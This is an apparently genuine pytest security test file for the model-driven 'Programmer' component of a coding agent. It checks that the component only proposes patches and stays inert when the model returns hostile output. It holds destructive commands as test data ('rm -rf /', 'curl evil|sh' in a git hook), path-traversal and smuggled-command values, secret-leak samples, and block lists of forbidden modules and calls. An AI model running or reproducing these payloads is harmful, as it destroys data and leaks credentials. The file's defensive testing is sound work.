"""Programmer security: proposes only. No writes, Git mutation, execution, network, secrets, or other services.

Static checks (with deliberate-break proofs) cover every programmer module;
runtime tripwires prove the Programmer still produces an in-memory patch
when every filesystem-mutation, process, network, Git, agent, tool,
orchestrator, planner, analyst-service, event, and task-mutation entry point
explodes on contact.
"""

import ast
import builtins
import contextlib
import importlib
import json
import logging
import os
import pathlib
import shutil
import socket
import subprocess
import sys
import time
from pathlib import Path

import pytest

from siamang.agents.registry import AgentRegistry
from siamang.analyst import SystemAnalyst
from siamang.bus import EventBus
from siamang.git import GitWorkspaceManager
from siamang.git import client as client_mod
from siamang.orchestrator import Orchestrator
from siamang.planner import Planner
from siamang.programmer import safety
from siamang.programmer.access import ProgrammerModelAccess
from siamang.programmer.errors import ProgrammingError
from siamang.storage import Database
from siamang.storage.events import EventStore
from siamang.tasks import TaskEngine
from siamang.tools.registry import ToolRegistry
from tests.support.analyst import SECRET, sample_project, write
from tests.support.fake_models import FAKE_SECRET
from tests.support.git import make_repo
from tests.support.programmer import AUTH, change, make_model, make_setup, reply, tree

SRC = Path(__file__).parents[2] / "src" / "siamang"
PROGRAMMER = SRC / "programmer"
MODEL_USERS = {"access.py", "strategy.py", "service.py"}  # service: the ModelRouter *type* only

FORBIDDEN_MODULES = {"subprocess", "os", "pathlib", "socket", "ssl", "http", "urllib", "sqlite3", "importlib",
                     "pkgutil", "inspect", "shutil", "glob", "fnmatch", "tempfile", "io", "asyncio", "threading",
                     "multiprocessing", "concurrent", "random", "secrets", "uuid", "time", "datetime", "pickle",
                     "marshal", "ctypes", "runpy", "code", "codeop", "dotenv", "git", "pygit2", "dulwich", "openai",
                     "anthropic", "ollama", "requests", "httpx", "aiohttp", "langchain", "langgraph", "crewai"}
FORBIDDEN_SIAMANG = ("siamang.storage", "siamang.agents", "siamang.orchestrator", "siamang.tools", "siamang.bus",
                     "siamang.config", "siamang.cli", "siamang.git", "siamang.planner.service",
                     "siamang.planner.strategy", "siamang.analyst.service", "siamang.analyst.strategy",
                     "siamang.analyst.git_state", "siamang.models.provider", "siamang.models.providers",
                     "siamang.models.factory", "siamang.models.registry")
FORBIDDEN_BUILTINS = {"getattr", "setattr", "delattr", "eval", "exec", "compile", "__import__", "open",
                      "breakpoint", "globals", "vars"}
FORBIDDEN_NAMES = {"Database", "EventStore", "EventBus", "TaskRepository", "GitClient", "GitWorkspaceManager",
                   "ToolRegistry", "AgentRegistry", "Orchestrator", "ModelProvider", "Planner", "SystemAnalyst",
                   "import_module", "system", "popen", "Popen", "environ", "getenv", "putenv", "walk", "rglob",
                   "glob", "connect", "remove", "unlink", "rmdir", "removedirs", "rename", "renames", "mkdir",
                   "makedirs", "chmod", "chown", "symlink", "link", "truncate", "write_text", "write_bytes",
                   "chdir", "kill", "fork", "O_WRONLY", "O_RDWR", "O_CREAT", "O_TRUNC", "O_APPEND", "rmtree",
                   "copyfile", "move", "touch", "ApprovalSystem"}
FORBIDDEN_CALLS = {"start", "wait", "requeue", "complete", "fail", "cancel", "retry", "create", "archive",
                   "restore", "execute", "invoke", "plan", "analyze", "run", "transaction", "publish",
                   "commit", "checkout", "merge", "reset", "push", "pull", "fetch", "stash", "apply", "approve", "write"}
MODEL_CALLS = {"generate", "select"}  # only access.py may call these


def violations(source: str, *, model_boundary: bool = False) -> set[str]:
    found = set()
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.Import):
            for a in node.names:
                if a.name.split(".")[0] in FORBIDDEN_MODULES or a.name.startswith(FORBIDDEN_SIAMANG):
                    found.add(a.name)
        elif isinstance(node, ast.ImportFrom) and node.module:
            if node.module.split(".")[0] in FORBIDDEN_MODULES or node.module.startswith(FORBIDDEN_SIAMANG):
                found.add(node.module)
        elif isinstance(node, ast.Name) and node.id in FORBIDDEN_BUILTINS | FORBIDDEN_NAMES:
            found.add(node.id)
        elif isinstance(node, ast.Attribute) and node.attr in FORBIDDEN_NAMES:
            found.add(node.attr)
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
            # The one sanctioned execution seam: the injected ToolRunner (sandbox), reached only as ``self._tools``.
            injected = isinstance(node.func.value, ast.Attribute) and node.func.value.attr == "_tools"
            if node.func.attr in FORBIDDEN_CALLS and not injected:
                found.add(f"call:{node.func.attr}")
            if node.func.attr in MODEL_CALLS and not model_boundary:
                found.add(f"call:{node.func.attr}")
        if isinstance(node, (ast.AsyncFunctionDef, ast.Await)):
            found.add("async")
    return found


def _strategy_generate_is_through_access(source: str) -> bool:
    """strategy.py may call ``models.generate`` (the access facade) and nothing else named generate/select."""
    calls = [n for n in ast.walk(ast.parse(source)) if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
             and n.func.attr in MODEL_CALLS]
    return all(isinstance(c.func.value, ast.Name) and c.func.value.id == "models" for c in calls) and len(calls) == 2  # ModelStrategy once; ToolStrategy once per turn (bounded by the access limit)


@pytest.mark.parametrize("path", sorted(PROGRAMMER.glob("*.py")), ids=lambda p: p.name)
def test_programmer_sources_are_clean(path):
    source = path.read_text(encoding="utf-8")
    found = violations(source, model_boundary=path.name in ("access.py", "strategy.py"))
    assert found == set(), found
    if path.name == "strategy.py":
        assert _strategy_generate_is_through_access(source)


def test_only_the_access_facade_touches_the_router():
    for path in PROGRAMMER.glob("*.py"):
        used = {n.func.attr for n in ast.walk(ast.parse(path.read_text())) if isinstance(n, ast.Call)
                and isinstance(n.func, ast.Attribute) and n.func.attr in ("select", "find_by_capabilities")}
        assert not used or path.name == "access.py", (path.name, used)
    users = {p.name for p in PROGRAMMER.glob("*.py")
             if any(isinstance(n, ast.ImportFrom) and n.module and n.module.startswith("siamang.models")
                    for n in ast.walk(ast.parse(p.read_text())))}
    assert users == MODEL_USERS


@pytest.mark.parametrize("snippet", [
    "import subprocess", "import os", "import pathlib", "import shutil", "import socket", "import sqlite3",
    "import importlib", "import tempfile", "from urllib.request import urlopen", "import openai", "import anthropic",
    "subprocess.run(['git', 'commit'])", "os.system('rm -rf /')", "os.popen('ls')", "eval(code)", "exec(code)",
    "compile(code, 'f', 'exec')", "fn = getattr(mod, 'run')", "open(path, 'w')", "Path(p).write_text(x)",
    "Path(p).write_bytes(b)", "os.remove(p)", "os.rename(a, b)", "shutil.rmtree(p)", "p.mkdir()", "p.touch()",
    "from siamang.git.client import GitClient", "GitClient().run(['commit'])", "self._git.commit('x')",
    "from siamang.tools.registry import ToolRegistry", "tools.invoke('workspace.write', ctx, {})",
    "from siamang.agents.registry import AgentRegistry", "agents.invoke('agent.programmer', r)",
    "from siamang.orchestrator import Orchestrator", "orchestrator.execute(r)", "planner.plan(r)",
    "from siamang.planner.service import Planner", "analyst.analyze(r)",
    "from siamang.analyst.service import SystemAnalyst", "self._tasks.start(t)", "self._tasks.complete(t, r)",
    "self._tasks.fail(t, e)", "self._tasks.cancel(t)", "from siamang.storage import Database",
    "EventStore(db).append(e)", "bus.publish(e)", "from siamang.bus import EventBus",
    "from siamang.models.provider import ModelProvider", "from siamang.models.providers.echo import EchoProvider",
    "router.select(r).generate(r)", "selection.generate(r)", "patch.apply()", "approval.approve(p)",
    "ApprovalSystem().check(p)", "from siamang.config import load_config", "os.environ['API_KEY']",
])
def test_static_check_catches_deliberate_breaks(snippet):
    assert violations(snippet)


# --- runtime tripwires -----------------------------------------------------------------------


@pytest.fixture
def tripwires():
    """``with tripwires() as calls:`` arms every forbidden entry point; they are disarmed on exit, before asserts."""

    @contextlib.contextmanager
    def armed():
        calls: list[str] = []
        mp = pytest.MonkeyPatch()
        routes = [(subprocess, "Popen"), (subprocess, "run"), (subprocess, "call"), (subprocess, "check_output"),
                  (os, "system"), (os, "popen"), (os, "remove"), (os, "unlink"), (os, "rename"), (os, "replace"),
                  (os, "mkdir"), (os, "makedirs"), (os, "rmdir"), (os, "removedirs"), (os, "symlink"),
                  (os, "chmod"), (os, "write"), (os, "truncate"), (os, "walk"), (os, "listdir"), (os, "getenv"),
                  (os, "putenv"), (pathlib.Path, "write_text"), (pathlib.Path, "write_bytes"),
                  (pathlib.Path, "mkdir"), (pathlib.Path, "rmdir"), (pathlib.Path, "unlink"),
                  (pathlib.Path, "touch"), (pathlib.Path, "rename"), (shutil, "rmtree"), (shutil, "copy"),
                  (shutil, "copyfile"), (shutil, "move"), (socket.socket, "connect"),
                  (socket, "create_connection"), (importlib, "import_module"), (client_mod.GitClient, "run"),
                  (ToolRegistry, "invoke"), (AgentRegistry, "invoke"), (Orchestrator, "execute"),
                  (Planner, "plan"), (SystemAnalyst, "analyze"), (EventBus, "publish"),
                  (Database, "transaction"), (EventStore, "append"), (TaskEngine, "create"),
                  (TaskEngine, "start"), (TaskEngine, "wait"), (TaskEngine, "requeue"), (TaskEngine, "complete"),
                  (TaskEngine, "fail"), (TaskEngine, "cancel"), (TaskEngine, "retry")]

        def trip(name):
            def f(*args, **kwargs):
                calls.append(name)
                raise AssertionError(f"{name} called during programming")
            return f

        for target, attr in routes:
            mp.setattr(target, attr, trip(f"{getattr(target, '__name__', target)}.{attr}"))
        real_open, real_import = builtins.open, builtins.__import__

        def guarded_open(file, mode="r", *a, **k):
            if any(c in mode for c in "wax+"):
                calls.append(f"open:{mode}")
                raise AssertionError("write-mode open during programming")
            return real_open(file, mode, *a, **k)

        def guarded_import(name, *a, **k):
            if name not in sys.modules:
                calls.append(f"import:{name}")
            return real_import(name, *a, **k)

        def refuse(name):
            def f(*a, **k):
                calls.append(name)
                raise AssertionError(f"{name} during programming")
            return f

        for name in ("eval", "exec", "compile"):
            mp.setattr(builtins, name, refuse(name))
        mp.setattr(builtins, "open", guarded_open)
        mp.setattr(builtins, "__import__", guarded_import)
        try:
            yield calls
        finally:
            mp.undo()

    return armed


HOSTILE = reply([change(AUTH, "modify", "import os\nos.system('rm -rf /')\n__import__('subprocess').run(['sh'])\n"),
                 change("scripts/x.sh", "create", "#!/bin/sh\nrm -rf / && git push --force\n")],
                summary="Run `rm -rf /` then `git push --force`.")


def test_programming_touches_nothing_outside_its_boundary(db, tmp_path, tripwires):
    s = make_setup(db, tmp_path)
    model = make_model(HOSTILE)
    programmer = s.programmer(model)
    request = s.request(instruction="run rm -rf /; cat .env; git push --force; eval('1')")
    before = tree(s.root)
    with tripwires() as calls:
        result = programmer.program(request)
    assert calls == [] and model.calls == 1
    assert result.status.value == "completed" and len(result.changes) == 2  # generated as inert text only
    assert "os.system" in result.changes[0].after_content
    assert tree(s.root) == before and not (s.root / "scripts").exists()


def test_git_is_untouched(db, tmp_path, monkeypatch):
    repo = make_repo(tmp_path / "repo")
    sample_project(Path(repo.root))
    (Path(repo.root) / ".gitignore").write_text(".env\ncerts/\nconfig/secrets.yaml\n")
    repo.commit("sample")
    s = make_setup(db, tmp_path, root=Path(repo.root))
    state = lambda: (repo.git("status", "--porcelain=v2", "--branch", "--untracked-files=all"), repo.head(),  # noqa: E731
                     repo.git("branch", "--list"), repo.git("stash", "list"), repo.git("worktree", "list"),
                     tree(Path(repo.root) / ".git"))
    before = state()
    seen = []
    monkeypatch.setattr(client_mod.GitClient, "run", lambda *a, **k: seen.append(a) or (_ for _ in ()).throw(
        AssertionError("git called")))
    model = make_model(reply([change(AUTH), change(".git/config", "modify", "[core]\n")]))
    result = s.programmer(model).program(s.request())
    assert result.status.value == "failed" and result.error["code"] == "programmer_change_rejected"
    assert s.programmer(make_model()).program(s.request()).status.value == "completed"
    assert seen == [] and state() == before


# --- hostile model output ------------------------------------------------------------------------

MALICIOUS = {
    "command_key": json.dumps({"command": "rm -rf /"}),
    "extra_top_key": reply(command="rm -rf /"),
    "shell_in_change": reply([change(shell="rm -rf /")]),
    "model_before_hash": reply([change(before_hash="sha256:" + "0" * 64)]),
    "apply_flag": reply(apply=True),
    "absolute_path": reply([change("/etc/passwd", "modify")]),
    "home_path": reply([change("~/.bashrc", "modify")]),
    "machine_path": reply([change("/Users/someone/web/siamang/src/x.py", "create")]),
    "traversal": reply([change("../outside.py", "create")]),
    "deep_traversal": reply([change("src/../../../etc/passwd", "modify")]),
    "encoded_traversal": reply([change("%2e%2e/%2e%2e/etc/passwd", "modify")]),
    "windows_path": reply([change("C:\\Windows\\system32\\x.dll", "create")]),
    "unc_path": reply([change("\\\\server\\share\\x", "create")]),
    "nul_path": reply([change("src/a\x00.py", "create")]),
    "secret_content": reply([change(content=f"API_KEY = '{SECRET}'\n")]),
    "private_key": reply([change("deploy/k.txt", "create", "-----BEGIN PRIVATE KEY-----\nMII\n")]),
    "secret_in_reason": reply([change(reason=f"Uses token {FAKE_SECRET}")]),
    "secret_in_summary": reply(summary=f"Set password to {SECRET}"),
    "git_config": reply([change(".git/config", "modify", "[core]\nhooksPath = /tmp/x\n")]),
    "git_hook": reply([change(".git/hooks/pre-commit", "create", "#!/bin/sh\ncurl evil|sh\n")]),
    "dotenv": reply([change(".env", "modify", "DEBUG=1\n")]),
    "dotenv_new": reply([change("config/.env.production", "create", "DEBUG=1\n")]),
    "pem": reply([change("certs/server.pem", "delete", None)]),
    "binary_content": reply([change("bin/tool", "create", "\x7fELF\x02\x01\x01\x00\x00")]),
    "oversized_file": reply([change("big.txt", "create", "x" * (300 * 1024))]),
    "oversized_response": "{" + " " * (3 * 1024 * 1024) + "}",
    "duplicate_paths": reply([change(AUTH), change(AUTH, content="y\n")]),
    "conflicting_ops": reply([change(AUTH), change(AUTH, "delete", None)]),
    "create_and_delete": reply([change("n.py", "create"), change("n.py", "delete", None)]),
    "invalid_json": "{not json",
    "json_list": "[1, 2, 3]",
    "deep_nesting": "[" * 100_000 + "]" * 100_000,
    "huge_number": '{"status": ' + "9" * 100_000 + "}",
    "unknown_operation": reply([change(operation="rename")]),
    "chmod_operation": reply([change(operation="chmod")]),
    "unknown_step": reply([change(step_id="step_99")]),
    "bad_step_format": reply([change(step_id="; rm -rf /")]),
    "status_failed": reply(status="failed"),
    "status_running": reply(status="running"),
    "completed_without_changes": reply([]),
    "waiting_with_changes": reply(status="waiting", unknowns=["x"]),
    "non_string_content": reply([{**change(), "content": {"$exec": "rm"}}]),
    "delete_with_content": reply([change("README.md", "delete", "x")]),
    "modify_without_content": reply([change(AUTH, "modify", None)]),
    "changes_not_list": reply(changes={"path": AUTH}),
    "empty": "",
}


@pytest.mark.parametrize("name", sorted(MALICIOUS))
def test_malicious_model_output_is_rejected_and_inert(db, tmp_path, tripwires, name):
    s = make_setup(db, tmp_path)
    model = make_model(MALICIOUS[name])
    programmer = s.programmer(model)
    before = tree(s.root)
    with tripwires() as calls:
        result = programmer.program(s.request())
    assert calls == [] and model.calls == 1
    assert result.status.value == "failed" and result.patch is None, result.status
    assert result.error["code"] in {"programmer_model_invalid_output", "programmer_change_rejected",
                                    "programmer_patch_invalid", "programmer_policy_denied", "programmer_result_invalid"}
    text = json.dumps(result.to_dict())
    assert SECRET not in text and FAKE_SECRET not in text and "/Users/someone" not in text
    assert tree(s.root) == before


def test_truncated_or_filtered_output(db, tmp_path):
    from siamang.models import FinishReason, ProviderOutput

    s = make_setup(db, tmp_path)
    for reason, code in ((FinishReason.LENGTH, "programmer_model_invalid_output"),
                         (FinishReason.CONTENT_FILTER, "programmer_model_rejected")):
        model = make_model(lambda m, r, _reason=reason: ProviderOutput(content=reply(), finish_reason=_reason))
        result = s.programmer(model).program(s.request())
        assert result.error["code"] == code and model.calls == 1


# --- the model boundary --------------------------------------------------------------------------


def test_one_generation_per_access(db, tmp_path):
    from siamang.models import ModelRequest

    model = make_model()
    access = ProgrammerModelAccess(model.router)
    access.generate(ModelRequest.from_prompt("hi"))
    with pytest.raises(ProgrammingError, match="one model generation"):
        access.generate(ModelRequest.from_prompt("again"))
    assert model.calls == 1


def test_failure_does_not_license_a_second_call(db, tmp_path):
    from siamang.models import ModelRequest

    model = make_model(fail_with=TimeoutError("slow"))
    access = ProgrammerModelAccess(model.router)
    with pytest.raises(ProgrammingError):
        access.generate(ModelRequest.from_prompt("hi"))
    with pytest.raises(ProgrammingError, match="one model generation"):
        access.generate(ModelRequest.from_prompt("again"))
    assert model.calls == 1


def test_access_refuses_pinning_and_extra_capabilities():
    from siamang.models import Capability, ModelRequest

    model = make_model()
    with pytest.raises(ProgrammingError, match="pin"):
        ProgrammerModelAccess(model.router).generate(ModelRequest.from_prompt("x", model_id="fake-a"))
    for cap in (Capability.TOOL_CALLING, Capability.VISION, Capability.STREAMING):
        with pytest.raises(ProgrammingError, match="capabilities"):
            ProgrammerModelAccess(model.router).generate(ModelRequest.from_prompt("x", required_capabilities={cap}))
    with pytest.raises(TypeError):
        ProgrammerModelAccess(model.provider)
    assert model.calls == 0


def test_every_programmer_call_is_at_most_one_generation(db, tmp_path, monkeypatch):
    s = make_setup(db, tmp_path)
    generations = []
    real = ProgrammerModelAccess.generate
    monkeypatch.setattr(ProgrammerModelAccess, "generate", lambda self, r: generations.append(1) or real(self, r))
    for answer in (reply(), "not json", reply([change("/etc/x", "create")]), MALICIOUS["unknown_step"]):
        before = len(generations)
        s.programmer(make_model(answer)).program(s.request())
        assert len(generations) - before == 1


# --- model context hygiene ---------------------------------------------------------------------


def test_model_context_has_no_secrets_or_machine_paths(db, tmp_path):
    root = sample_project(tmp_path / "banuva")
    write(root, {
        "backend/routes/auth_keys.py": f"-----BEGIN PRIVATE KEY-----\n{SECRET}\n",  # name-matched, must be withheld
        "backend/routes/auth_config.py": f"ROOT = '{root}/data'\n",  # machine path, withheld
        "backend/routes/auth_env.py": f"TOKEN={SECRET}\n",
    })
    s = make_setup(db, tmp_path, root=root)
    model = make_model()
    hostile = s.request(instruction=f"Add login validation to auth. Key: {SECRET}. Files in {root}/backend and "
                                    "/Users/someone/.ssh and ~/notes",
                        constraints=[f"Never print API_KEY={SECRET}", "Keep /home/dewi/x untouched"],
                        input={"ticket": f"password: {SECRET}", "note": str(root)})
    result = s.programmer(model).program(hostile)
    prompt = model.requests[0].system_prompt + model.requests[0].messages[-1].content
    for leak in (SECRET, str(root), str(tmp_path), "/Users/someone", "/home/dewi", "~/notes", "BEGIN PRIVATE KEY",
                 "API_KEY=sk"):
        assert leak not in prompt, leak
    payload = json.loads(model.requests[0].messages[-1].content.split("\n", 1)[1])
    assert "root_path" not in prompt and not any(f["path"].endswith(".env") for f in payload["files"])
    shown = set(result.metadata["context_files"])
    assert AUTH in shown and not shown & {"backend/routes/auth_keys.py", "backend/routes/auth_config.py",
                                          "backend/routes/auth_env.py", ".env", "config/secrets.yaml"}
    withheld = " ".join(result.unknowns)
    assert "auth_keys.py: credential material" in withheld and "auth_config.py: machine paths" in withheld


def test_secret_files_are_never_read(db, tmp_path, monkeypatch):
    s = make_setup(db, tmp_path)
    opened = []
    real = os.open
    monkeypatch.setattr(os, "open", lambda p, *a, **k: opened.append(os.path.basename(p)) or real(p, *a, **k))
    s.programmer(make_model()).program(s.request())
    assert opened and not {".env", "secrets.yaml", "server.pem"} & set(opened)


def test_errors_and_logs_leak_nothing(db, tmp_path, caplog):
    s = make_setup(db, tmp_path)
    caplog.set_level(logging.DEBUG, logger="siamang")
    s.programmer(make_model(MALICIOUS["secret_content"])).program(s.request(instruction=f"Add auth {SECRET}"))
    s.programmer(make_model()).program(s.request())
    text = caplog.text
    assert SECRET not in text and "Add auth" not in text and "def login" not in text and str(s.root) not in text
    assert "programming task=" in text


def test_secret_detection_is_linear_time():
    for text in ("x" * (1 << 20), "a=b " * (1 << 18), "'" * (1 << 20), ("k" * 79 + "=") * (1 << 14),
                 ("api_key" + "-" * 70 + ": '") * (1 << 13)):
        start = time.perf_counter()
        safety.find_secret(text)
        assert time.perf_counter() - start < 2.0


def test_no_mutation_tools_were_added():
    from siamang.tools.implementations import KNOWN_IMPLEMENTATIONS

    names = " ".join(KNOWN_IMPLEMENTATIONS).lower()
    for word in ("write", "patch", "apply", "commit", "branch", "worktree.create", "delete", "rename"):
        assert word not in names, word


def test_no_programmer_agent_exists():
    from siamang.agents.implementations import KNOWN_IMPLEMENTATIONS

    assert not any("program" in k for k in KNOWN_IMPLEMENTATIONS)
    assert not AgentRegistry().exists("agent.programmer")


def test_workspace_manager_is_not_used(db, tmp_path, monkeypatch):
    s = make_setup(db, tmp_path)
    for name in ("inspect", "worktrees", "status", "diff"):
        if hasattr(GitWorkspaceManager, name):
            monkeypatch.setattr(GitWorkspaceManager, name, lambda *a, **k: (_ for _ in ()).throw(AssertionError()))
    assert s.programmer(make_model()).program(s.request()).status.value == "completed"
